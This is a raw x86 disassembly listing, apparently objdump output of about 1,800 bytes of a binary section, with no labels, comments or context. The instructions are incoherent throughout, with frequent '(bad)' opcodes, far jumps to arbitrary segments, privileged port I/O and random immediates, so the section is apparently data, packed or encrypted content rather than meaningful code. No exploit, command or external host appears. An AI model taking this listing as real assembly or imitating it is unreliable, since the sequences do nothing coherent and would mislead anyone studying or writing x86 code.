  40a4ac:	test   DWORD PTR [ebp+0x7e],0x371049a7
  40a4b3:	out    dx,al
  40a4b4:	mov    cl,0x9d
  40a4b6:	jmp    0xa4bf:0x51b28169
  40a4bd:	inc    edx
  40a4be:	jp     0x40a4e9
  40a4c0:	inc    eax
  40a4c1:	mov    ch,0x91
  40a4c3:	xor    DWORD PTR ds:0x56860c81,esp
  40a4c9:	and    DWORD PTR [edi-0x2e8e088f],edx
  40a4cf:	inc    edi
  40a4d0:	(bad)  
  40a4d1:	out    0x18,eax
  40a4d3:	dec    edx
  40a4d4:	jae    0x40a4b3
  40a4d6:	xchg   esp,eax
  40a4d7:	push   ecx
  40a4d8:	fisttp DWORD PTR es:[edi+0x2235a0a7]
  40a4df:	xchg   ebp,eax
  40a4e0:	sub    ebx,DWORD PTR [esp+ebp*2+0x53]
  40a4e4:	push   ss
  40a4e5:	cmp    ecx,ebp
  40a4e7:	mov    al,0xc2
  40a4e9:	mov    esp,0x4ac18e8f
  40a4ee:	(bad)  
  40a4ef:	pop    esi
  40a4f0:	test   ah,ah
  40a4f2:	leave  
  40a4f3:	ins    BYTE PTR es:[edi],dx
  40a4f4:	or     edi,DWORD PTR [ebp-0x7c0209d5]
  40a4fa:	push   0x676333d0
  40a4ff:	sbb    ebp,edi
  40a501:	xor    al,0x6d
  40a503:	out    dx,al
  40a504:	jg     0x40a57a
  40a506:	in     eax,0x4c
  40a508:	repnz in eax,dx
  40a50a:	inc    ecx
  40a50b:	ret    0x1450
  40a50e:	das    
  40a50f:	lea    edi,[ecx-0x16850347]
  40a515:	(bad)  
  40a517:	xchg   DWORD PTR [eax],ebx
  40a519:	sub    ebp,DWORD PTR [ebx-0x5b]
  40a51c:	mov    al,0xf2
  40a51e:	add    BYTE PTR [esi],ah
  40a520:	mov    edx,0xc799801a
  40a525:	dec    ecx
  40a526:	cwde   
  40a527:	adc    al,0xfb
  40a529:	adc    eax,0x960baab6
  40a52e:	add    esp,DWORD PTR [esi]
  40a530:	cmp    al,0xe6
  40a532:	add    BYTE PTR [ebx+0x1d],bh
  40a535:	add    al,0x39
  40a537:	fninit 
  40a539:	es sahf 
  40a53b:	in     eax,0xf3
  40a53d:	jnp    0x40a4c3
  40a53f:	adc    ch,bh
  40a541:	dec    eax
  40a542:	pusha  
  40a543:	mov    ecx,DWORD PTR [edi+ebp*1+0x4d84d4c2]
  40a54a:	cli    
  40a54b:	adc    BYTE PTR [ecx+0x76],cl
  40a54e:	fild   WORD PTR [ebx-0xf393009]
  40a554:	lods   eax,DWORD PTR ds:[esi]
  40a555:	dec    esp
  40a556:	daa    
  40a557:	hlt    
  40a558:	ret    
  40a559:	aad    0xd6
  40a55b:	xchg   esp,eax
  40a55c:	jb     0x40a51d
  40a55e:	pop    esp
  40a55f:	inc    esi
  40a560:	sahf   
  40a561:	sub    al,0xc5
  40a563:	cmp    eax,0xe2cd0ac5
  40a568:	int3   
  40a569:	xchg   esi,eax
  40a56a:	add    ch,bh
  40a56c:	push   0xa6e078ef
  40a571:	fisub  DWORD PTR [edx+0x46c5944b]
  40a577:	stos   DWORD PTR es:[edi],eax
  40a578:	ficom  WORD PTR [eax-0x47]
  40a57b:	int3   
  40a57c:	pop    edi
  40a57d:	cmp    esp,ebp
  40a57f:	mov    bl,0xd8
  40a581:	ret    
  40a582:	push   0xffffff95
  40a584:	xchg   ebx,eax
  40a586:	icebp  
  40a587:	loop   0x40a557
  40a589:	out    0xf0,al
  40a58b:	mov    DWORD PTR [esi-0x54],ecx
  40a58e:	push   ds
  40a58f:	pop    edx
  40a590:	pop    ebx
  40a591:	mov    esp,0x697489eb
  40a596:	out    dx,al
  40a597:	arpl   bp,bp
  40a599:	out    0xd5,al
  40a59b:	cmp    ecx,DWORD PTR [esi]
  40a59d:	shr    BYTE PTR [ecx-0x796ae0fd],0xbf
  40a5a4:	sub    BYTE PTR [edi-0x6356c837],ch
  40a5aa:	imul   esi,DWORD PTR [eax+0x2de896d0],0x7eb295f0
  40a5b4:	scas   eax,DWORD PTR es:[edi]
  40a5b5:	(bad)  
  40a5b6:	jnp    0x40a5bd
  40a5b8:	int3   
  40a5b9:	fisub  DWORD PTR [edi+0x69]
  40a5bc:	dec    esp
  40a5bd:	rol    DWORD PTR [edx+esi*1],0xf4
  40a5c1:	or     ecx,DWORD PTR [ecx+0xe0cbf6]
  40a5c7:	or     eax,0xf74302c2
  40a5cc:	lods   eax,DWORD PTR ds:[esi]
  40a5cd:	sar    BYTE PTR [edi-0x3edf6990],cl
  40a5d3:	sti    
  40a5d4:	mov    dh,0x71
  40a5d6:	fucom  st(0)
  40a5d8:	lahf   
  40a5d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5da:	and    eax,0x6c99e1b0
  40a5df:	call   0xad34:0x3017368c
  40a5e6:	push   ecx
  40a5e7:	dec    edi
  40a5e9:	inc    esp
  40a5ea:	mov    ds,WORD PTR [ebp+eiz*2-0xd]
  40a5ee:	repnz add bl,BYTE PTR [ebx-0xb54eee8]
  40a5f5:	js     0x40a5a3
  40a5f7:	or     bh,ah
  40a5f9:	adc    BYTE PTR [eax+0x76],cl
  40a5fc:	ds dec ebx
  40a5fe:	push   es
  40a5ff:	imul   ecx,edx,0x93286fdf
  40a605:	gs mov esp,0x37aeece9
  40a60b:	and    ebp,ebp
  40a60d:	or     eax,0x12f7a2a4
  40a612:	jp     0x40a5d3
  40a614:	popa   
  40a615:	out    dx,eax
  40a616:	jnp    0x40a655
  40a618:	in     eax,0x4
  40a61a:	push   ss
  40a61b:	jmp    0x72e0:0x986b1ad5
  40a622:	jb     0x40a66d
  40a624:	xor    eax,0x264b1058
  40a629:	and    BYTE PTR [ecx-0x28d801d5],ah
  40a62f:	loopne 0x40a5da
  40a631:	scas   eax,DWORD PTR es:[edi]
  40a632:	or     ah,BYTE PTR [esi-0x1b]
  40a635:	pop    ecx
  40a636:	jo     0x40a652
  40a638:	bound  ebp,QWORD PTR [eax-0x73]
  40a63b:	mov    eax,0xb423beb8
  40a640:	inc    edi
  40a641:	out    0x73,al
  40a643:	stos   BYTE PTR es:[edi],al
  40a644:	loopne 0x40a68e
  40a646:	stos   BYTE PTR es:[edi],al
  40a647:	pop    ss
  40a648:	popf   
  40a649:	clc    
  40a64a:	repz dec ebp
  40a64c:	mov    eax,ds:0xfcfad930
  40a651:	adc    DWORD PTR [ecx+0x60e18bf],ecx
  40a657:	or     esi,esi
  40a659:	dec    ecx
  40a65a:	push   0x8d67198
  40a65f:	mov    ds:0x5cffe96,eax
  40a664:	bound  ebx,QWORD PTR [ebx+0x71ea773a]
  40a66a:	mov    eax,ds:0x77df5a7d
  40a66f:	hlt    
  40a670:	inc    eax
  40a671:	add    DWORD PTR [edx],esi
  40a673:	xchg   edx,eax
  40a674:	dec    esp
  40a675:	mov    esi,0x7e855c16
  40a67a:	push   ss
  40a67b:	pushf  
  40a67c:	das    
  40a67d:	shr    DWORD PTR ds:0x493689fa,cl
  40a683:	mov    al,0x22
  40a685:	in     al,0xf9
  40a687:	adc    esp,eax
  40a689:	popa   
  40a68a:	ror    BYTE PTR [esi+0x5ce82b8f],0x6f
  40a691:	adc    DWORD PTR [edi],esp
  40a693:	cmp    DWORD PTR [ecx],0x1a
  40a696:	sbb    eax,0x62ac15b5
  40a69b:	xchg   edi,eax
  40a69c:	lods   eax,DWORD PTR ds:[esi]
  40a69d:	dec    ebx
  40a69e:	cmp    eax,0x790e78dd
  40a6a3:	jne    0x40a683
  40a6a5:	ss stos DWORD PTR es:[edi],eax
  40a6a7:	(bad)  
  40a6a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6a9:	xor    ch,BYTE PTR [ecx-0x46]
  40a6ac:	out    dx,eax
  40a6ad:	push   edi
  40a6ae:	sub    bh,BYTE PTR [eax]
  40a6b0:	xchg   ebp,eax
  40a6b1:	push   edi
  40a6b2:	xchg   esp,eax
  40a6b3:	(bad)  
  40a6b4:	fdivr  DWORD PTR ds:0xf9402f44
  40a6ba:	repnz outs dx,BYTE PTR ds:[esi]
  40a6bc:	pop    edx
  40a6bd:	pushf  
  40a6be:	mov    esi,0x60de85c8
  40a6c3:	pushf  
  40a6c4:	xchg   BYTE PTR [ebx],cl
  40a6c6:	jns    0x40a725
  40a6c8:	imul   ebp,esp,0xffffffa6
  40a6cb:	xor    al,0xf6
  40a6cd:	ret    0x57ec
  40a6d0:	in     eax,dx
  40a6d1:	lods   eax,DWORD PTR ds:[esi]
  40a6d2:	maxps  xmm4,XMMWORD PTR ds:0xb6a1130e
  40a6d9:	inc    edi
  40a6da:	mov    dl,BYTE PTR [edx]
  40a6dc:	retf   
  40a6dd:	scas   al,BYTE PTR es:[edi]
  40a6de:	inc    eax
  40a6df:	ja     0x40a68f
  40a6e1:	mov    ss,WORD PTR [ebp+0x1b]
  40a6e4:	aad    0xa6
  40a6e6:	clc    
  40a6e7:	cmp    al,0xd
  40a6e9:	mov    esi,0xf7833c97
  40a6ee:	xor    al,0xb0
  40a6f0:	repnz push es
  40a6f2:	aaa    
  40a6f3:	cdq    
  40a6f4:	sbb    al,0x19
  40a6f6:	dec    edi
  40a6f7:	outs   dx,BYTE PTR ds:[esi]
  40a6f8:	loopne 0x40a6d7
  40a6fa:	mov    ds:0x31aa758f,eax
  40a6ff:	jmp    0xb920:0x5d19794f
  40a706:	data16 fisub DWORD PTR [esi]
  40a709:	mov    edx,0x7c285c3b
  40a70e:	fld    TBYTE PTR [ecx-0x3b]
  40a711:	jbe    0x40a78b
  40a713:	neg    edi
  40a715:	bound  ebp,QWORD PTR [esi]
  40a717:	int3   
  40a718:	in     al,dx
  40a719:	xor    ebp,DWORD PTR [ebp+0x750fd046]
  40a71f:	retf   0xdb05
  40a722:	stos   DWORD PTR es:[edi],eax
  40a723:	in     al,dx
  40a724:	jmp    DWORD PTR ds:0x2bdf6685
  40a72a:	inc    esi
  40a72b:	push   ss
  40a72c:	pop    edx
  40a72d:	cmp    DWORD PTR [eax-0x79ce3eda],ecx
  40a733:	shr    BYTE PTR [edi],1
  40a735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a736:	ds pop es
  40a738:	in     al,0x2c
  40a73a:	addr16 lahf 
  40a73c:	jmp    0xbce0805b
  40a741:	push   eax
  40a742:	mov    edx,0xb9626be1
  40a747:	into   
  40a748:	pushf  
  40a749:	(bad)  
  40a74a:	neg    ah
  40a74c:	jbe    0x40a6ff
  40a74e:	pushf  
  40a74f:	ror    DWORD PTR [edx],cl
  40a751:	retf   
  40a752:	pushf  
  40a753:	addr16 aam 0x4d
  40a756:	inc    edx
  40a757:	dec    ebx
  40a758:	xchg   esp,eax
  40a759:	xchg   dl,ch
  40a75b:	push   cs
  40a75c:	sbb    al,0x63
  40a75e:	test   eax,0x5c9d9f98
  40a763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a764:	mov    eax,0x19a1f96
  40a769:	jbe    0x40a7a9
  40a76b:	out    0x25,eax
  40a76d:	push   es
  40a76e:	aaa    
  40a76f:	lods   al,BYTE PTR ds:[esi]
  40a770:	cmp    ebp,esi
  40a772:	retf   
  40a773:	mov    edx,0x70124d80
  40a778:	iret   
  40a779:	xchg   esp,eax
  40a77a:	std    
  40a77b:	or     eax,DWORD PTR [ecx+0x39]
  40a77e:	fs inc ebx
  40a780:	mov    ah,0xf0
  40a782:	jmp    FWORD PTR [eax-0x5673f8f5]
  40a788:	(bad)  
  40a789:	idiv   BYTE PTR [eax]
  40a78b:	iret   
  40a78c:	hlt    
  40a78d:	adc    al,0x80
  40a78f:	jl     0x40a720
  40a791:	lods   eax,DWORD PTR ds:[esi]
  40a792:	ret    
  40a793:	jmp    0x9d04:0xd4da8c5d
  40a79a:	fnstsw WORD PTR [edx+0x7f]
  40a79d:	and    BYTE PTR [ebx-0x64],dl
  40a7a0:	cmovns edx,ecx
  40a7a3:	dec    edi
  40a7a4:	mov    al,BYTE PTR [edx+0x3f2701c6]
  40a7aa:	dec    edi
  40a7ab:	mov    DWORD PTR [ecx+0x54],ecx
  40a7ae:	aaa    
  40a7af:	adc    dh,bh
  40a7b1:	pop    ebx
  40a7b2:	ret    
  40a7b3:	test   al,0x5a
  40a7b5:	pop    edi
  40a7b6:	mov    BYTE PTR [edi-0x55d30206],bl
  40a7bc:	mov    dh,0x16
  40a7be:	jno    0x40a803
  40a7c0:	mov    esi,0x2fe4455
  40a7c5:	mov    ah,0xbb
  40a7c7:	retf   
  40a7c8:	push   edx
  40a7c9:	pop    ss
  40a7ca:	inc    ebx
  40a7cb:	adc    ch,BYTE PTR [eax]
  40a7cd:	rcr    DWORD PTR [ebx-0x4cba434],0xa6
  40a7d4:	cwde   
  40a7d5:	test   DWORD PTR [edx],0x3acb99e
  40a7db:	jle    0x40a803
  40a7dd:	jl     0x40a85a
  40a7df:	out    0xa9,al
  40a7e1:	and    edx,DWORD PTR [eax+0x4f]
  40a7e4:	push   ds
  40a7e5:	ins    BYTE PTR es:[edi],dx
  40a7e6:	push   ss
  40a7e7:	add    DWORD PTR [esi+0x3c],esi
  40a7ea:	popa   
  40a7eb:	dec    esp
  40a7ec:	sar    BYTE PTR [esi+0x5a829378],1
  40a7f2:	xor    ebx,edx
  40a7f4:	xor    dh,al
  40a7f6:	icebp  
  40a7f7:	mov    ah,0x81
  40a7f9:	xchg   esi,eax
  40a7fa:	mov    edi,0xfb363e72
  40a7ff:	and    BYTE PTR [edx+0x23c9431e],bl
  40a805:	fwait
  40a806:	adc    cl,BYTE PTR [ebx+0x6c82525b]
  40a80c:	mov    esp,0x29caa9c8
  40a811:	cmp    esi,DWORD PTR [ebp+0x456e8c81]
  40a817:	jmp    0x9e74:0x921f2d92
  40a81e:	and    edi,ebx
  40a820:	aam    0x6b
  40a822:	mov    cl,0x87
  40a824:	sub    eax,0x35752c1b
  40a829:	sbb    eax,0x143439f4
  40a82e:	xchg   edx,eax
  40a82f:	xchg   DWORD PTR [eax+ebp*1-0x2b43ea4d],ebx
  40a836:	lock jb 0x40a803
  40a839:	int3   
  40a83a:	or     eax,DWORD PTR ds:0xda5b1b5a
  40a840:	mov    cl,0x46
  40a842:	repnz aas 
  40a844:	hlt    
  40a845:	hlt    
  40a846:	dec    edx
  40a847:	outs   dx,BYTE PTR ds:[esi]
  40a848:	inc    ebp
  40a849:	dec    esp
  40a84a:	push   ebp
  40a84b:	push   cs
  40a84c:	sbb    bl,BYTE PTR [esi+ecx*4+0x5e]
  40a850:	sbb    al,0xe9
  40a852:	cld    
  40a853:	xchg   edi,eax
  40a854:	test   DWORD PTR [ebp+ebp*1+0x6b3370f6],ecx
  40a85b:	test   BYTE PTR [ebx],ch
  40a85d:	and    BYTE PTR [esi-0x43e987e2],bl
  40a863:	xchg   esi,eax
  40a864:	mov    ebp,DWORD PTR [esi]
  40a866:	sub    dh,BYTE PTR [ecx]
  40a868:	jmp    0x40a86a
  40a86a:	js     0x40a8d5
  40a86c:	mov    al,ds:0xbda9f3fb
  40a871:	xchg   esp,eax
  40a872:	leave  
  40a873:	addr16 cwde 
  40a875:	ja     0x40a8d6
  40a877:	and    eax,0xe92214a8
  40a87c:	sub    DWORD PTR [esi+0x532976b],0xffffffaf
  40a883:	aad    0xed
  40a885:	mov    esi,0xe6b8f56f
  40a88a:	mov    ecx,0x981f3734
  40a88f:	mov    edx,0x280e58e
  40a894:	(bad)  
  40a895:	cli    
  40a896:	inc    edx
  40a897:	popa   
  40a898:	pop    edi
  40a899:	lahf   
  40a89a:	std    
  40a89b:	rcr    DWORD PTR [ebx-0x4],1
  40a89e:	pop    ecx
  40a89f:	sbb    BYTE PTR [ecx+0x100a555a],bl
  40a8a5:	(bad)  
  40a8a7:	dec    ebx
  40a8a8:	mov    dh,0xcf
  40a8aa:	adc    ebp,esi
  40a8ac:	push   ds
  40a8ad:	mov    dl,0xb0
  40a8af:	jo     0x40a8b4
  40a8b1:	aas    
  40a8b2:	int3   
  40a8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8b4:	test   al,0x18
  40a8b6:	pop    ss
  40a8b7:	test   DWORD PTR [eax],ebp
  40a8b9:	mov    bl,0x32
  40a8bb:	je     0x40a887
  40a8bd:	push   eax
  40a8be:	and    eax,0xd9ef607b
  40a8c3:	xchg   ebp,eax
  40a8c4:	xor    eax,0x7ec646d5
  40a8c9:	std    
  40a8ca:	aad    0x9a
  40a8cc:	fisub  DWORD PTR [ebp+0x7e]
  40a8cf:	push   ebp
  40a8d0:	dec    esp
  40a8d1:	scas   al,BYTE PTR es:[edi]
  40a8d2:	mov    eax,0x4cfa62a4
  40a8d7:	loop   0x40a8c6
  40a8d9:	(bad)  
  40a8db:	daa    
  40a8dc:	es jne 0x40a951
  40a8df:	pop    ecx
  40a8e0:	and    bl,BYTE PTR [esi]
  40a8e2:	cmp    eax,0x39ccc1e7
  40a8e7:	xlat   BYTE PTR ds:[ebx]
  40a8e8:	jecxz  0x40a90c
  40a8ea:	shl    BYTE PTR [ecx-0x38],0x98
  40a8ee:	cmc    
  40a8ef:	push   edx
  40a8f0:	mov    ecx,DWORD PTR [edx+0x37fa1adb]
  40a8f6:	out    0xb8,al
  40a8f8:	cmc    
  40a8f9:	mov    bh,0x5b
  40a8fb:	das    
  40a8fc:	scas   eax,DWORD PTR es:[edi]
  40a8fd:	imul   esp,DWORD PTR [esi-0x77],0xffffff89
  40a901:	(bad)  
  40a902:	cmp    DWORD PTR [ecx-0x7f],edx
  40a905:	pop    ebx
  40a906:	hlt    
  40a907:	std    
  40a908:	iret   
  40a909:	test   eax,0x3777bcca
  40a90e:	fcom   st(5)
  40a910:	fwait
  40a911:	pop    ss
  40a912:	cwde   
  40a913:	ret    0x6e98
  40a916:	sbb    ebx,DWORD PTR [esp+ecx*2-0x1168f603]
  40a91d:	bound  esp,QWORD PTR [ebx-0x1e]
  40a920:	scas   al,BYTE PTR es:[edi]
  40a921:	adc    dh,dh
  40a923:	sub    DWORD PTR [edx-0x31ced088],esp
  40a929:	pushf  
  40a92a:	rcr    BYTE PTR [ecx],1
  40a92c:	imul   ebp,DWORD PTR [ebx+0x79432728],0x48
  40a933:	xchg   ebx,eax
  40a934:	das    
  40a935:	js     0x40a977
  40a937:	enter  0xd0c4,0xea
  40a93b:	int3   
  40a93c:	aam    0x1a
  40a93e:	and    al,0x11
  40a940:	push   esi
  40a941:	mov    dh,0x91
  40a943:	cmovns ebp,DWORD PTR [edi+0x7d]
  40a947:	xchg   BYTE PTR [eax-0x4b],bl
  40a94a:	aas    
  40a94b:	adc    BYTE PTR [eax+eax*4-0x136febeb],dl
  40a952:	mov    eax,0xdee4abd8
  40a957:	aad    0x89
  40a959:	in     al,dx
  40a95a:	ins    BYTE PTR es:[edi],dx
  40a95b:	xchg   ebp,eax
  40a95c:	sbb    dh,0x20
  40a95f:	push   0xffffffdf
  40a961:	or     bl,BYTE PTR [eax+0x323b64d9]
  40a967:	fwait
  40a968:	sub    BYTE PTR [ebp+eiz*2+0x5af94ede],0xde
  40a970:	add    dl,BYTE PTR [ecx-0x38aadd44]
  40a976:	data16 test BYTE PTR [ebp+0x4e140627],ch
  40a97d:	sbb    BYTE PTR [edi+0x1af0cef2],dl
  40a983:	inc    edx
  40a984:	shl    BYTE PTR [ebp-0x9],cl
  40a987:	ret    0x9027
  40a98a:	fcmove st,st(6)
  40a98c:	scas   al,BYTE PTR es:[edi]
  40a98d:	inc    eax
  40a98e:	stos   BYTE PTR es:[edi],al
  40a98f:	mov    eax,ds:0x5a6577c8
  40a994:	xor    al,0x5c
  40a996:	mov    gs,ebx
  40a998:	inc    esi
  40a999:	dec    edi
  40a99a:	xchg   ecx,eax
  40a99b:	push   0x14
  40a99d:	cmc    
  40a99e:	in     eax,0x7
  40a9a0:	sbb    BYTE PTR [esi+0x96f4796],dl
  40a9a6:	mov    edx,0x85615c3
  40a9ab:	inc    edx
  40a9ac:	(bad)
  40a9b0:	ror    DWORD PTR [ecx+0x397b8718],cl
  40a9b6:	or     DWORD PTR [eax-0x4298ba48],edi
  40a9bc:	hlt    
  40a9bd:	push   edx
  40a9be:	inc    esi
  40a9bf:	stc    
  40a9c0:	aam    0xf3
  40a9c2:	adc    BYTE PTR [ebx],ch
  40a9c4:	arpl   WORD PTR [eax+0x5a],ax
  40a9c7:	imul   ebx,esp,0xffffffd7
  40a9ca:	ss push esp
  40a9cc:	cs fsub DWORD PTR ss:[esi+0x3692b9f]
  40a9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d5:	cmp    DWORD PTR [ebx-0x77d9ae7b],esp
  40a9db:	inc    edi
  40a9dc:	rol    ah,cl
  40a9de:	push   ss
  40a9df:	inc    esp
  40a9e0:	inc    ecx
  40a9e1:	jmp    0x40a9ef
  40a9e3:	call   0x5a400184
  40a9e8:	pop    ecx
  40a9e9:	aad    0x6a
  40a9eb:	add    bl,BYTE PTR [eax-0x43]
  40a9ee:	mov    esi,0x7041eaa
  40a9f3:	mov    ds:0xd39ae453,al
  40a9f8:	sahf   
  40a9f9:	jle    0x40a9f9
  40a9fb:	dec    esi
  40a9fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9fd:	mov    bh,0xd0
  40a9ff:	pop    ebp
  40aa00:	(bad)  
  40aa01:	scas   al,BYTE PTR es:[edi]
  40aa02:	jmp    0x75acfccf
  40aa07:	inc    edx
  40aa08:	push   edi
  40aa09:	cmp    eax,0x99a6c35a
  40aa0e:	dec    ebx
  40aa0f:	ds retf 0x831e
  40aa13:	ins    DWORD PTR es:[edi],dx
  40aa14:	push   cs
  40aa15:	js     0x40a9be
  40aa17:	mov    ah,0x27
  40aa19:	ror    DWORD PTR [eax-0x55c214f5],cl
  40aa1f:	jp     0x40a9dc
  40aa21:	out    dx,al
  40aa22:	out    0xcb,al
  40aa24:	dec    ebx
  40aa25:	sub    al,0xfc
  40aa27:	xchg   esi,eax
  40aa28:	and    DWORD PTR [ecx+0x2d],edx
  40aa2b:	mov    ah,0x7
  40aa2d:	in     al,dx
  40aa2e:	mov    al,ds:0xacd406f
  40aa33:	iret   
  40aa34:	mov    dl,0xd
  40aa36:	popf   
  40aa37:	pop    eax
  40aa38:	adc    al,0x98
  40aa3a:	js     0x40aab8
  40aa3c:	loopne 0x40aa75
  40aa3e:	push   0x38
  40aa40:	idiv   DWORD PTR [ebx+0xad439ad]
  40aa46:	xchg   edx,eax
  40aa47:	nop
  40aa48:	and    ecx,DWORD PTR [ecx+0x1de9257d]
  40aa4e:	jbe    0x40aac6
  40aa50:	je     0x40aa30
  40aa52:	add    BYTE PTR [eax],dh
  40aa54:	xchg   esp,eax
  40aa55:	xor    esi,DWORD PTR [edi+eiz*8+0x22]
  40aa59:	inc    edx
  40aa5a:	and    eax,0x43155859
  40aa5f:	cli    
  40aa60:	adc    al,0xdb
  40aa62:	sub    bh,ah
  40aa64:	jge    0x40aa51
  40aa66:	xchg   ebx,eax
  40aa67:	xchg   ebp,eax
  40aa68:	addr16 sub al,0xee
  40aa6b:	aad    0x63
  40aa6d:	lods   al,BYTE PTR ds:[esi]
  40aa6e:	call   FWORD PTR [eax+0x2c3ac557]
  40aa74:	inc    ebp
  40aa75:	or     eax,0x6ce4c767
  40aa7a:	ins    DWORD PTR es:[edi],dx
  40aa7b:	jge    0x40aa6e
  40aa7d:	pushf  
  40aa7e:	pop    es
  40aa7f:	pushf  
  40aa80:	or     BYTE PTR [edi-0x3b],cl
  40aa83:	pop    ecx
  40aa84:	ins    DWORD PTR es:[edi],dx
  40aa85:	lods   eax,DWORD PTR ds:[esi]
  40aa86:	in     al,dx
  40aa87:	jae    0x40aadf
  40aa89:	adc    eax,0xd403b580
  40aa8e:	jmp    0xbc79:0xe06f6365
  40aa95:	les    edi,FWORD PTR [eax-0x3d]
  40aa98:	or     BYTE PTR [esi],bh
  40aa9a:	stos   DWORD PTR es:[edi],eax
  40aa9b:	lahf   
  40aa9c:	inc    ebp
  40aa9d:	jae    0x40aa55
  40aa9f:	jg     0x40aa4f
  40aaa1:	hlt    
  40aaa2:	loope  0x40aa9b
  40aaa4:	test   eax,0xadebc2c3
  40aaa9:	add    eax,0xc5854379
  40aaae:	jl     0x40aa5c
  40aab0:	push   edi
  40aab1:	or     BYTE PTR ds:0x9cd0f6be,al
  40aab7:	push   ebp
  40aab8:	mov    ebx,0x47c92469
  40aabd:	jbe    0x40aaa6
  40aabf:	jno    0x40aa49
  40aac1:	push   0x7e
  40aac3:	mov    DWORD PTR [edi+0x4a6e43f5],edi
  40aac9:	push   edi
  40aaca:	mov    al,0xca
  40aacc:	loope  0x40aaf3
  40aace:	inc    esp
  40aacf:	mov    ds:0x8ec5e844,eax
  40aad4:	cdq    
  40aad5:	cwde   
  40aad6:	pop    ebp
  40aad7:	sub    al,0xd9
  40aad9:	stc    
  40aada:	(bad)  
  40aadb:	inc    eax
  40aadc:	or     eax,0xbc1df853
  40aae1:	inc    ecx
  40aae2:	pusha  
  40aae3:	scas   al,BYTE PTR es:[edi]
  40aae4:	adc    BYTE PTR [ecx],al
  40aae6:	aaa    
  40aae7:	jne    0x40ab4c
  40aae9:	lahf   
  40aaea:	push   esp
  40aaeb:	push   esp
  40aaec:	popf   
  40aaed:	adc    BYTE PTR [edx+0x535f88d9],0x70
  40aaf4:	jns    0x40ab17
  40aaf6:	pop    edi
  40aaf7:	adc    al,0x85
  40aaf9:	pop    es
  40aafa:	fisttp QWORD PTR [ebx+0x74]
  40aafe:	add    bh,ch
  40ab00:	mov    edi,0xc886b2c8
  40ab05:	ins    DWORD PTR es:[edi],dx
  40ab06:	fidiv  DWORD PTR [ebp-0x5b]
  40ab09:	cmc    
  40ab0a:	push   eax
  40ab0b:	inc    ecx
  40ab0c:	xchg   edx,eax
  40ab0d:	adc    eax,0xc1ab9b57
  40ab12:	and    eax,0x3407ae79
  40ab17:	mov    edx,0xca9ac80f
  40ab1c:	(bad)  
  40ab1d:	adc    dh,BYTE PTR [ebp+edx*4+0xa]
  40ab21:	push   0x79786dae
  40ab26:	lock push edx
  40ab28:	out    dx,al
  40ab29:	jo     0x40ab36
  40ab2b:	adc    dh,bh
  40ab2d:	test   al,0x57
  40ab2f:	mov    esp,0xcb95427
  40ab34:	sbb    al,0x8d
  40ab36:	iret   
  40ab37:	dec    ecx
  40ab38:	dec    ebx
  40ab39:	clc    
  40ab3a:	icebp  
  40ab3b:	mov    esp,DWORD PTR [ebp-0x4f]
  40ab3e:	sub    ecx,DWORD PTR [ecx]
  40ab40:	mov    edx,0x5047a5c3
  40ab45:	in     al,0xfe
  40ab47:	add    bh,cl
  40ab49:	fmul   DWORD PTR [edx+0x23]
  40ab4c:	push   ss
  40ab4d:	std    
  40ab4e:	xchg   BYTE PTR [edx+esi*4-0x66],dl
  40ab52:	jecxz  0x40aafb
  40ab54:	enter  0x79da,0x5a
  40ab58:	pop    eax
  40ab59:	loopne 0x40aadb
  40ab5b:	fst    st(1)
  40ab5d:	in     al,dx
  40ab5e:	pop    ss
  40ab5f:	jb     0x40ab2e
  40ab61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab62:	xor    ch,BYTE PTR [eax]
  40ab64:	test   esp,0xbc12643f
  40ab6a:	mov    eax,fs
  40ab6c:	dec    ebx
  40ab6d:	out    dx,eax
  40ab6e:	jg     0x40aba7
  40ab70:	push   ebp
  40ab71:	sub    BYTE PTR [ebp-0x2bdde85e],cl
  40ab77:	or     ecx,DWORD PTR [ecx]
  40ab79:	or     ecx,0xffffffb8
  40ab7c:	cmp    eax,0xc2f4c94a
  40ab81:	dec    ebp
  40ab82:	(bad)  
  40ab83:	ds test al,0x4
  40ab86:	enter  0xe3e0,0xc9
  40ab8a:	pop    es
  40ab8b:	cdq    
  40ab8c:	pusha  
  40ab8d:	outs   dx,BYTE PTR ds:[esi]
  40ab8e:	sbb    edx,DWORD PTR ds:0x79e121c3
  40ab94:	out    dx,eax
  40ab95:	pop    ecx
  40ab96:	mov    edx,0x6985e6c5
  40ab9b:	cdq    
  40ab9c:	mov    dh,0x52
  40ab9e:	and    BYTE PTR [ebp+0x4668b285],0x49
  40aba5:	cli    
  40aba6:	dec    eax
  40aba7:	cmp    BYTE PTR [edi+0x261402cf],dh
  40abad:	fs inc edx
  40abaf:	retf   
  40abb0:	sbb    BYTE PTR [eax-0x66],bh
  40abb3:	into   
  40abb4:	push   ss
  40abb5:	sar    eax,cl
  40abb7:	dec    edi
  40abb8:	cmc    
  40abb9:	sar    DWORD PTR [ebp+0x70],0x48
  40abbd:	mov    esp,0xdc950700
  40abc2:	sbb    eax,0xc92572d6
  40abc7:	ja     0x40ab49
  40abc9:	push   ecx
  40abca:	lea    ebp,[eax+ecx*1]
  40abcd:	adc    eax,0x387ac8ea
  40abd2:	pop    ebp
  40abd3:	pop    es
  40abd4:	add    ecx,eax
  40abd6:	mov    eax,0xf5e081dc
  40abdb:	mov    eax,ebp
  40abdd:	lock scas eax,DWORD PTR es:[edi]
  40abdf:	bound  ecx,QWORD PTR [ebx-0x4b]
  40abe2:	mov    DWORD PTR [ebp+0x62c7f612],ecx
  40abe8:	jno    0x40abaf
  40abea:	or     ebx,ecx
  40abec:	cdq    
  40abed:	mov    ?,WORD PTR [ecx+ebx*8+0x3fda60a2]
  40abf4:	mov    ah,0x1d
  40abf6:	sar    BYTE PTR [ecx-0x4198ca14],1
  40abfc:	mov    dh,ch
  40abfe:	out    dx,al
  40abff:	vmwrite edi,DWORD PTR [edi]
  40ac02:	shl    BYTE PTR [ecx],cl
  40ac04:	out    0xd7,eax
  40ac06:	call   0x30c5715a
  40ac0b:	mov    dl,0xf5
  40ac0d:	pop    eax
  40ac0e:	pop    ss
